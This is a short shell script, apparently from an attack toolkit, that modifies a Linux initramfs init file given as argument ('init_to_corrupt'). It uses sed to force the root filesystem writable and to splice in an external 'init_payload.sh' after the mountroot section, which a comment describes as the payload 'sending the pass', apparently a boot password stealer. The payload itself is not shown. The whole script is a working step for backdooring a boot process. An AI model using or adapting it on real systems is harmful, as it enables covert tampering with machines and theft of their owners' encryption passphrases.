#!/bin/sh

if [ $# -lt 1 ]; then
	echo "Usage: $0 init_to_corrupt"
	exit 1
fi

init=$1
payload_file="init_payload.sh"

# Contains find_var_name
# . ./infect_functions.sh

# Add the "no readonly"
if ! sed -i 'N;/readonly=.*;;/,/done/s/\(\s*done.*\)$/\1\nreadonly=n/;' $init
then
    echo "error while sedding the init file (readonly=n part)"
    exit 1
fi

# Add the payload sending the pass
# TODO: make it more robust
pattern_lines="`sed -n '/mountroot/,/log_end_msg/ =' $init`"
last_line="`echo "$pattern_lines" | tail -n1`"

if ! sed -i "$last_line r $payload_file" $init; then
    echo "error while sedding the init file (payload part)"
    exit 1
fi

